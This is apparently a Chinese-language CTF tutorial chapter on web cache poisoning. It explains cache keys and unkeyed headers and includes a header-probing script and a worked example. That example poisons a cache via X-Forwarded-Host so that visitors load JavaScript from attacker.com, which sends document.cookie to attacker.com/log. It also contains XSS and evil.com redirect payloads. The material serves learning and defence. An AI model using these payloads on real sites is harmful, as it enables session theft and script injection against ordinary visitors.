---
comments: true
---

# 缓存投毒

缓存投毒（Web Cache Poisoning）的核心思想一句话就能说清：**攻击者精心构造一个请求，让缓存服务器把"有毒"的响应存下来，之后所有正常用户拿到的都是这份毒响应**。它本身不是一种独立的漏洞类型，而是把缓存机制当成"放大器"，把一次性的攻击（比如反射 XSS）变成持续命中所有访客的存储型攻击。

在 CTF 里，这类题通常伪装成一个带 CDN 或反向代理的普通站点，关键在于你能不能意识到"缓存"这一层的存在，并找出它的缓存键（Cache Key）规则。

## Web 缓存机制入门

### 为什么需要缓存

一个典型的现代 Web 架构长这样：

```text
用户 ──> CDN / 反向代理（Nginx、Varnish、Cloudflare...） ──> 后端应用
```

动态页面每次都要跑一遍后端逻辑、查一遍数据库，开销很大。于是中间加一层缓存：对于"看起来一样"的请求，直接返回之前存好的响应，后端根本不会被惊动。静态资源（`.js`、`.css`、图片）几乎必被缓存，很多站点还会缓存整个 HTML 页面。

### Cache Key：缓存凭什么认为两个请求"一样"

缓存服务器收到请求后，会算出一个 **Cache Key**，用它去查自己存没存过对应响应。Cache Key 通常由这些部分组成：

```http
GET /index.html HTTP/1.1
Host: example.com
```

- 请求方法（`GET`）
- Host 头
- 请求路径 + 查询字符串（`/index.html?utm_source=xx` 和 `/index.html` 往往是不同的 Key）

关键在于：**请求里的其他部分——各种额外的 Header、Cookie——默认不参与 Cache Key**。这些"不参与算键、但可能影响响应内容"的输入，就是后面要讲的非键控输入（unkeyed input），也是一切缓存投毒的入口。

可以用 Burp Suite 的 Param Miner 插件或手动加一对随机参数来探测缓存行为：如果响应里出现 `Age: 34`、`X-Cache: Hit`、`CF-Cache-Status: HIT` 之类的头，说明你命中了缓存。

## 非键控输入（Unkeyed Input）

### 概念

所谓 unkeyed input，就是：**服务器处理请求时会读它、并把它写进响应，但缓存算 Key 时却忽略它**。

最常见的候选者：

- `X-Forwarded-Host`：反向代理把原始 Host 透传给后端时用的头，后端经常直接拿它拼接链接、生成重定向地址。
- `X-Forwarded-Scheme` / `X-Forwarded-Proto`：影响后端判断当前是 HTTP 还是 HTTPS。
- `X-Forwarded-For`：有些应用会把它回显在页面里。
- `User-Agent`、`Referer`：偶尔会被后端读去做逻辑分支或回显。

举个例子，后端可能有这样的代码：

```php
<?php
// 根据 X-Forwarded-Host 生成站内链接
$host = $_SERVER['HTTP_X_FORWARDED_HOST'] ?? $_SERVER['HTTP_HOST'];
echo "<link rel=\"stylesheet\" href=\"https://{$host}/static/app.css\">";
```

如果 `X-Forwarded-Host` 不参与 Cache Key，麻烦就来了。

### 怎么发现

方法很朴素：**挨个请求头塞一个独一无二的值，看响应里有没有把它吐回来**。

```http
GET / HTTP/1.1
Host: victim.com
X-Forwarded-Host: attacker-7f3a.example.com
```

```http
HTTP/1.1 200 OK
X-Cache: Miss
Content-Type: text/html

<link rel="stylesheet" href="https://attacker-7f3a.example.com/static/app.css">
```

两个条件同时满足才算有戏：

1. 响应中出现了你注入的值（说明后端读了这个头）；
2. 缓存忽略这个头（带不同值请求同一 URL，返回的却是同一份缓存，可用 `X-Cache: Hit/Miss` 和随机参数验证）。

Burp 的 Param Miner 可以自动跑这个流程；手动做的话，写个小脚本批量试也行：

```python
import requests

url = "https://victim.com/"
headers_to_try = [
    "X-Forwarded-Host", "X-Forwarded-Scheme", "X-Forwarded-For",
    "X-Host", "X-Original-URL", "X-Rewrite-URL",
]

for h in headers_to_try:
    canary = f"canary-{h.lower()}.example.com"
    r = requests.get(url, headers={h: canary}, timeout=10)
    hit = "Hit" if canary in r.text else "----"
    cache = r.headers.get("X-Cache", "-")
    print(f"{h:25s} reflect={hit}  X-Cache={cache}")
```

## 投毒利用面

### 反射 XSS 固化

这是缓存投毒最经典的价值：**把一次性的反射 XSS 变成"存储型"**。

普通反射 XSS 需要诱骗受害者点你的特制链接；而如果反射点位于 unkeyed input，且响应会被缓存，那么你只要投毒一次，缓存有效期内 **所有访问该 URL 的 normal 用户** 都会执行你的脚本。

假设后端把 `User-Agent` 回显进页面（且不参与 Cache Key）：

```http
GET /search?q=hello HTTP/1.1
Host: victim.com
User-Agent: <script>alert(document.domain)</script>
```

响应 HTML 里原样嵌入了这段 UA，同时返回 `X-Cache: Miss`——这份有毒响应被写进缓存。之后任何人请求 `/search?q=hello`，拿到的都是带恶意脚本的页面，无需再点任何钓鱼链接。关于 XSS 的基础利用方式，可以交叉阅读本书「XSS攻击」一章。

实战中的注意点：

- 投毒前先给 URL 加一个随机参数（如 `?q=hello&cb=12345`）确认缓存行为，避免直接污染线上正常页面。
- 缓存有 TTL（`Age` 头会告诉你已存了多久），过期后要重新投毒；CTF 里通常 TTL 很长或手动刷新即可。
- 防御方视角：只缓存真正的静态资源、把 `Vary` 头配对、不让后端信任 `X-Forwarded-*`。

### 重定向劫持

另一种常见玩法：后端的 302 跳转地址由 unkeyed input 决定。

```http
GET /logout HTTP/1.1
Host: victim.com
X-Forwarded-Host: evil.com
```

```http
HTTP/1.1 302 Found
Location: https://evil.com/welcome
X-Cache: Miss
```

这份 302 被缓存后，所有点"退出登录"的用户都会被送往 `evil.com`。如果劫持的是 JS 静态资源的 URL（前面 `X-Forwarded-Host` 拼 `href` 的例子），效果等同 XSS：受害者浏览器会从你的服务器加载恶意 JS，还能长期控制。这类"拼接 URL 时信任了不该信的头"的思路，和「SSRF注入」里 URL 处理不当的问题一脉相承。

### 与请求走私的配合

顺带一提：缓存投毒还可以和「HTTP 请求走私」配合——用走私请求把毒响应"塞"进别人请求对应的缓存槽位，实现无需等待目标 URL 被访问的精准投毒。CTF 中偶尔作为组合考点出现，知道有这条路即可，细节可参考请求走私相关资料。

## 例题：一道典型的缓存投毒题

> 题目描述：某博客站点套了 CDN，hint 提示"管理员每天都会阅读首页"。目标是拿到 admin 的 Cookie（即打到 admin 身上的 XSS）。

### 第一步：确认缓存层存在

访问首页，响应头里有：

```http
HTTP/1.1 200 OK
X-Cache: Hit
Age: 120
```

有 `X-Cache` 和 `Age`，说明前面确实有缓存。连续请求同一 URL，`Age` 不断增长且 `X-Cache: Hit`——缓存生效中。

### 第二步：找 unkeyed input

用上面的小脚本或手工逐个试请求头，发现：

```bash
curl -s -D - "https://target.ctf/" -H "X-Forwarded-Host: test123.example.com" -o body.html
grep "test123" body.html
```

`body.html` 中出现：

```html
<script src="https://test123.example.com/static/analytics.js"></script>
```

后端用 `X-Forwarded-Host` 拼了统计脚本的地址，并原样输出。再用不同的 `X-Forwarded-Host` 值请求同一 URL，第二次返回 `X-Cache: Hit` 且 HTML 还是第一次的内容——**确认该头不参与 Cache Key，且响应可缓存**。条件齐了。

### 第三步：投毒

自己 VPS 上放一个恶意 JS：

```javascript
// https://attacker.com/static/analytics.js
new Image().src = "https://attacker.com/log?c=" + document.cookie;
```

然后发送投毒请求（注意第一次请求必须是 `Miss`，毒响应才会被写进去；必要时换个带随机参数的 URL 或等缓存过期）：

```bash
curl -s "https://target.ctf/?fresh=1" -H "X-Forwarded-Host: attacker.com"
```

确认响应里 `<script src="https://attacker.com/static/analytics.js">` 且后续普通请求（不带任何特殊头）访问 `/?fresh=1` 也返回同样的毒页面、`X-Cache: Hit`。

### 第四步：坐等收杆

题目说 admin 每天看首页——但注意我们毒的是 `/?fresh=1` 这个 Key。正规做法是先确认首页 `/` 本身可缓存再直接对 `/` 投毒（CTF 环境里污染靶机首页是可接受的），或者利用题目提供的"report URL"功能让 bot 访问被投毒的地址。

admin 浏览器加载首页 → 从 `attacker.com` 拉取 `analytics.js` → Cookie 外带：

```text
GET /log?c=flag=flag%7Bc4che_p0ison_st0red_xss%7D HTTP/1.1
```

拿到 flag，收工。

### 复盘要点

- 整条链路：**发现缓存 → 找 unkeyed input → 验证可缓存反射点 → 投毒 → 等受害者命中**。
- 本质是"反射 XSS + 缓存放大"，所以 XSS 的基本功（见「XSS攻击」）依然是前置知识。
- 拿到题目先盯响应头：`X-Cache`、`Age`、`CF-Cache-Status`、`Vary`，它们会告诉你缓存层的脾气。

## 小结

缓存投毒的门槛不在"漏洞利用"，而在"意识到缓存的存在并摸清它的 Key 规则"。记住三句话：

1. 缓存只按 Cache Key 区分请求，Key 之外的头（`X-Forwarded-Host` 等）是攻击面；
2. 凡是"响应会被缓存 + unkeyed input 被回显/用于拼接"的地方，都可能把一次性漏洞固化成全员命中；
3. 做题先侦察（`X-Cache`/`Age`），再注入 canary 验证，最后才投毒。
